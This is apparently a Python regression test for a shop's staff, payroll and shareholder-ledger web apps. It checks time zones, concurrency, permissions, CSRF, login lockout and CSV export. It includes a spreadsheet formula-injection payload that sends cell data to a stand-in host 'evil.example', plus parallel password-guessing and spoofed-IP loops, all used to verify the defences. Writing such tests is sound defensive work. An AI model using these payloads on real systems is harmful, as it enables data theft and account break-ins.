# -*- coding: utf-8 -*-
"""擴展性／漏洞檢視（2026-10-20）回歸測試：暫存資料庫＋5621／5622 埠，不碰正式資料。跑法：python test_qa_review.py
- 時區：伺服器設成 UTC 也照台灣時間記打卡
- 多支手機同時打卡、店長同時記帳、新人同時註冊、同時備份：不會 database is locked、不掉資料、備份完整
- 權限：夥伴、店長叫不動老闆 API
- 暴力猜密碼：同時送 40 個請求也繞不過「連錯 8 次鎖 15 分鐘」（員工系統、股東網站都測）
- CSV 匯出防公式注入
- 國定假日／基本工資沒填到的年份會警示
- 股東頁薪資成本含老闆調整（獎金、抽成）
"""
import base64, http.cookiejar, json, os, secrets, shutil, sqlite3, subprocess, sys, tempfile, threading, time, urllib.request, urllib.error
from datetime import date, datetime, timedelta, timezone

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))   # app/
ROOT = os.path.dirname(HERE)
tmp = tempfile.mkdtemp()
DB = os.path.join(tmp, "crm.db")
PORT, LPORT = "5621", "5622"
CF = 0x08000000 if os.name == "nt" else 0          # Windows：子程序不開黑色視窗
env = dict(os.environ, CRM_DB=DB, CRM_BAK=os.path.join(tmp, "bak"), CRM_PORT=PORT, CRM_EXP_START="2026-01-01", TZ="UTC0")
env.pop("SHOP_TZ", None)
sys.path.insert(0, HERE)
os.environ.update(CRM_DB=DB, CRM_BAK=os.path.join(tmp, "bak"), CRM_EXP_START="2026-01-01")
import app, payroll as P, cfg  # noqa: E402

app.init_db()
c = app.db()
PW = {}
USERS = [("qboss", "老闆", "admin"), ("qmgr", "店長", "manager")] + [("qs%02d" % i, "夥伴%d" % i, "staff") for i in range(10)]
for un, name, role in USERS:
    PW[un] = secrets.token_urlsafe(10)
    c.execute("INSERT INTO users(username,name,pw,role,created) VALUES(?,?,?,?,?)", (un, name, app.hash_pw(PW[un]), role, app.now()))
ids = {r["username"]: r["id"] for r in c.execute("SELECT id, username FROM users")}
for i in range(10):
    c.execute("INSERT INTO pay_profile(user_id,kind,amount,off_days,punch) VALUES(?,?,?,?,1)", (ids["qs%02d" % i], "monthly", 36000, 8))
    c.execute("INSERT INTO shifts(user_id,effective,s1,e1) VALUES(?,?,?,?)", (ids["qs%02d" % i], "2026-01-01", "09:00", "18:00"))
c.commit(); c.close()
srv = subprocess.Popen([sys.executable, os.path.join(HERE, "app.py")], env=env, cwd=HERE, creationflags=CF)
time.sleep(2)
BASE = "http://127.0.0.1:" + PORT
fails = []
JPG = "data:image/jpeg;base64," + base64.b64encode(b"\xff\xd8\xff\xe0" + b"0" * 3000).decode()


def client(base=None):
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def call(path, body=None, headers=None):
        h = {"Content-Type": "application/json", "X-Req": "1"} if body is not None else {}
        h.update(headers or {})
        req = urllib.request.Request((base or BASE) + path, data=json.dumps(body).encode() if body is not None else None, headers=h)
        try:
            r = op.open(req, timeout=60); raw = r.read()
            return r.status, (json.loads(raw) if r.headers.get_content_type() == "application/json" else raw)
        except urllib.error.HTTPError as e:
            raw = e.read()
            try: return e.code, json.loads(raw)
            except Exception: return e.code, raw
    return call


def check(name, cond, extra=""):
    print(("OK  " if cond else "BAD ") + name + (("　" + str(extra)) if extra and not cond else ""))
    if not cond: fails.append(name)


def parallel(fns):
    out, lk = [], threading.Lock()
    def run(f):
        r = f()
        with lk: out.append(r)
    ths = [threading.Thread(target=run, args=(f,)) for f in fns]
    for t in ths: t.start()
    for t in ths: t.join()
    return out


try:
    cl = {un: client() for un, _, _ in USERS}
    for un in cl: cl[un]("/api/login", {"username": un, "password": PW[un]})

    # ── 時區：伺服器程序 TZ=UTC，打卡時間仍是台灣時間
    tw = (datetime.now(timezone.utc) + timedelta(hours=8)).replace(tzinfo=None)
    s, d = cl["qs00"]("/health")
    srv_now = datetime.strptime(d["at"], "%Y-%m-%d %H:%M:%S")
    check("伺服器設成 UTC，系統時間仍是台灣時間（UTC+8）", abs((srv_now - tw).total_seconds()) < 120, (d["at"], tw))

    # ── 併發：10 支手機同時打卡＋店長同時記 40 筆支出＋10 人同時看日誌（GET 也會寫）＋10 位新人同時註冊＋同時手動備份
    today = date.today().isoformat()
    fns = [lambda un="qs%02d" % i: ("punch",) + cl[un]("/api/punch", {"lat": 24.75, "lng": 121.74, "acc": 10}) for i in range(10)]
    fns += [lambda i=i: ("exp",) + cl["qmgr"]("/api/fin/exp", {"day": today, "category": "其他", "item": "QA%d" % i, "amount": 100 + i, "photo": JPG}) for i in range(40)]
    fns += [lambda un="qs%02d" % i: ("journal",) + cl[un]("/api/journal") for i in range(10)]
    fns += [lambda i=i: ("reg",) + client()("/api/register", {"name": "新人%d" % i, "username": "qnew%d" % i, "password": "abcdef12"},
                                            {"Cf-Connecting-Ip": "10.0.0.%d" % i}) for i in range(10)]
    fns += [lambda: ("backup",) + cl["qboss"]("/api/backup", {})]
    t0 = time.time(); res = parallel(fns)
    bad = [r for r in res if r[1] != 200]
    check("併發 71 個請求全部成功（沒有 database is locked）", not bad, bad[:3])
    k = sqlite3.connect(DB)
    check("10 筆打卡都有存", k.execute("SELECT COUNT(*) FROM punches WHERE voided=0").fetchone()[0] == 10)
    check("40 筆支出都有存、沒有重複", k.execute("SELECT COUNT(*), COUNT(DISTINCT item) FROM fin_exp WHERE item LIKE 'QA%'").fetchone() == (40, 40))
    check("10 位新人註冊都有存", k.execute("SELECT COUNT(*) FROM users WHERE pending=1 AND username LIKE 'qnew%'").fetchone()[0] == 10)
    check("資料庫是 WAL 模式", k.execute("PRAGMA journal_mode").fetchone()[0] == "wal")
    k.close()
    bk = [f for f in os.listdir(os.path.join(tmp, "bak")) if f.endswith("_manual.db")]
    b = sqlite3.connect(os.path.join(tmp, "bak", bk[0])) if bk else None
    check("寫入中備份（SQLite backup API）：備份檔完整、讀得到", b is not None and b.execute("PRAGMA integrity_check").fetchone()[0] == "ok"
          and b.execute("SELECT COUNT(*) FROM users").fetchone()[0] >= 12)
    if b: b.close()

    # ── 權限
    st = cl["qs01"]
    for path in ("/api/boss/payroll", "/api/boss/settings", "/api/boss/punches", "/api/fin/list", "/api/fin/day", "/boss/slips", "/api/journal/threads"):
        check("夥伴不能看 " + path, st(path)[0] in (403, 404))
    check("夥伴不能看匯出", st("/api/export")[0] in (403, 404))
    for path, body in (("/api/user/save", {"id": ids["qs01"], "role": "admin"}),
                       ("/api/boss/profile/save", {"user_id": ids["qs01"], "kind": "monthly", "amount": 99999, "off_days": 8}),
                       ("/api/boss/adjust/save", {"user_id": ids["qs01"], "month": today[:7], "amount": 5000, "reason": "x"}),
                       ("/api/fin/verify", {"kind": "all", "approve": True, "day": today})):
        check("夥伴叫不動 " + path, st(path, body)[0] == 403)
    check("店長不能看薪資", cl["qmgr"]("/api/boss/payroll")[0] == 403)
    check("店長不能把自己升成老闆", cl["qmgr"]("/api/user/save", {"id": ids["qmgr"], "role": "admin"})[0] == 403)
    req = urllib.request.Request(BASE + "/api/punch", data=b"lat=1", headers={"Content-Type": "application/x-www-form-urlencoded"})
    try: urllib.request.urlopen(req); code = 200
    except urllib.error.HTTPError as e: code = e.code
    check("CSRF：沒有 X-Req 的表單 POST 擋掉", code == 403)

    # ── 暴力猜密碼：同時 40 個錯誤密碼
    codes = [r[0] for r in parallel([lambda: client()("/api/login", {"username": "qs09", "password": "x" + secrets.token_hex(4)}) for _ in range(40)])]
    check("同時 40 個猜密碼請求：最多 8 個真的被驗證，其他直接鎖", codes.count(401) <= 8 and codes.count(429) >= 32, (codes.count(401), codes.count(429)))
    check("鎖住後，正確密碼也要等 15 分鐘", client()("/api/login", {"username": "qs09", "password": PW["qs09"]})[0] == 429)
    check("別的帳號不受影響", client()("/api/login", {"username": "qs08", "password": PW["qs08"]})[0] == 200)

    # ── CSV 公式注入
    cl["qboss"]("/api/lead/new", {"name": '=HYPERLINK("http://evil.example/?"&A1,"點我")', "note": "@SUM(1)", "phone": "03-1234567"})
    s, raw = cl["qboss"]("/api/export?kind=leads")
    txt = raw.decode("utf-8-sig") if isinstance(raw, bytes) else ""
    check("CSV 匯出：= 開頭加 ' 變文字", "'=HYPERLINK" in txt and "'@SUM" in txt and "03-1234567" in txt, txt[-200:])
finally:
    srv.terminate()
    try: srv.wait(10)
    except Exception: srv.kill()

# ── 國定假日／基本工資：沒填到的年份要警示，不能靜靜算錯
f26 = P.legal_pay("monthly", 36000, 8, "2026-10", {"2026-10-05": 480})["flags"]
f27 = P.legal_pay("monthly", 36000, 8, "2027-01", {"2027-01-04": 480})["flags"]
check("2026 年有設定：沒有缺年份警示", not any("勞動曆沒有" in x for x in f26), f26)
check("2027 年沒有國定假日清單：警示", any("沒有 2027 年的國定假日" in x for x in f27), f27)
check("2027 年沒有基本工資：警示", any("沒有 2027 年的基本工資" in x for x in f27), f27)
check("2027 年警示講清楚去哪補（config/labor_calendar/2027.toml）", any("labor_calendar/2027.toml" in x for x in f27), f27)
check("2027 年基本工資檢查標明暫用 2026 數字", P.min_wage(2027).get("year") == 2026 and P.min_wage(2026).get("monthly") == 29500, P.min_wage(2027))
check("2026 國定假日來自 labor_calendar 且含小年夜與春節", {"2026-02-15", "2026-02-17", "2026-10-10"} <= P.holidays(2026), sorted(P.holidays(2026))[:3])
check("2027 沒設定：國定假日是空集合（由警示提醒）", P.holidays(2027) == set() or P.year_missing(2027) == [], P.year_missing(2027))
check("12 月時啟動檢查會提前提醒明年", any("下個月就是" in x for x in P.calendar_status("2026-12-05")), P.calendar_status("2026-12-05"))
import tempfile
_td = tempfile.mkdtemp()
_t30 = 'year = 2030\n[minimum_wage]\nmonthly = 30000\nhourly = 200\n[holidays]\ndates = ["2030-01-01", "2031-01-01"]\n'
open(os.path.join(_td, "2030.toml"), "w", encoding="utf-8").write(_t30)
open(os.path.join(_td, "2031.toml"), "w", encoding="utf-8").write("this is not toml ===")
_cal, _prob = cfg.load_labor_calendar(_td, {})
check("勞動曆：正確檔讀進來、錯年份日期被略過並列問題", _cal[2030]["holidays"] == ["2030-01-01"] and _cal[2030]["minimum_wage"]["monthly"] == 30000 and any("2031-01-01" in x for x in _prob), (_cal, _prob))
check("勞動曆：壞檔不讓系統掛掉，只列問題", 2031 not in _cal and any("2031.toml" in x for x in _prob), _prob)

# ── 股東頁：薪資成本＝應發＋老闆調整
sys.path.insert(0, os.path.join(ROOT, "ledger", "builder"))
import build_ledger as B  # noqa: E402
k = app.db()
uid = ids["qs02"]; m = "2026-09"
for dd in ("2026-09-01", "2026-09-02"):
    k.execute("INSERT INTO punches(user_id,at,kind,source) VALUES(?,?,?,?)", (uid, dd + " 09:00:00", "in", "test"))
    k.execute("INSERT INTO punches(user_id,at,kind,source) VALUES(?,?,?,?)", (uid, dd + " 18:00:00", "out", "test"))
k.execute("INSERT INTO adjustments(user_id,month,amount,reason,created) VALUES(?,?,?,?,?)", (uid, m, 3000, "9 月獎金", app.now()))
k.commit()
rows = [r for r in P.month_rows(k, m) if r["base"] or r["net"] or r["adj"]]
k.close()
db_ = B.read_db(DB, "2026-09-01", "2026-09-30")
want = sum(r["base"] + r["adj"] for r in rows)
check("股東頁薪資成本含老闆調整（獎金 3,000）", db_["payroll"][m]["gross"] == want and db_["payroll"][m]["adj"] == 3000, (db_["payroll"].get(m), want))
data = B.build({"ledger": {"period_start": "2026-09-01"}}, db_, "2026-09-30")
check("股東頁盈餘有扣到獎金", data["total"]["payroll"] == want and data["total"]["profit"] == -want - data["total"]["pension"], data["total"])

# ── 股東網站：同時猜密碼、偽造 IP 都繞不過鎖
auth = os.path.join(tmp, "ledger_auth.json")
salt = secrets.token_bytes(16)
import hashlib  # noqa: E402
json.dump({"salt": salt.hex(), "iter": 1000, "hash": hashlib.pbkdf2_hmac("sha256", b"12345678", salt, 1000).hex(), "secret": secrets.token_hex(32)},
          open(auth, "w", encoding="utf-8"))
lenv = dict(os.environ, LEDGER_PORT=LPORT, LEDGER_AUTH=auth, LEDGER_WWW=os.path.join(tmp, "www"))
lsrv = subprocess.Popen([sys.executable, os.path.join(ROOT, "ledger", "serve.py")], env=lenv, creationflags=CF)
time.sleep(1.5)


class NoRedir(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None


lop = urllib.request.build_opener(NoRedir)


def try_pw(pw, ip):
    req = urllib.request.Request("http://127.0.0.1:%s/login" % LPORT, data=("pw=%s" % pw).encode(), headers={"CF-Connecting-IP": ip})
    try: return lop.open(req, timeout=30).status
    except urllib.error.HTTPError as e: return e.code


try:
    codes = parallel([lambda i=i: try_pw("%08d" % i, "1.1.1.1") for i in range(30)])
    check("股東網站：同一 IP 同時 30 次猜密碼，最多 8 次真的被驗證", codes.count(401) <= 8 and codes.count(429) >= 22, (codes.count(401), codes.count(429)))
    check("股東網站：鎖住後同一 IP 正確密碼也進不去", try_pw("12345678", "1.1.1.1") == 429)
    check("股東網站：換一個 IP 正確密碼可以進", try_pw("12345678", "2.2.2.2") == 303)
    codes = parallel([lambda i=i: try_pw("%08d" % (100 + i), "7.7.%d.%d" % (i // 250, i % 250)) for i in range(60)])
    check("股東網站：偽造 60 個不同 IP 猜密碼，全站合計 40 次後也會鎖", codes.count(429) >= 12, (codes.count(401), codes.count(429)))
finally:
    lsrv.terminate()
    try: lsrv.wait(10)
    except Exception: lsrv.kill()
shutil.rmtree(tmp, ignore_errors=True)
print("\n全部通過" if not fails else "\n有 %d 項沒過：%s" % (len(fails), fails))
sys.exit(1 if fails else 0)
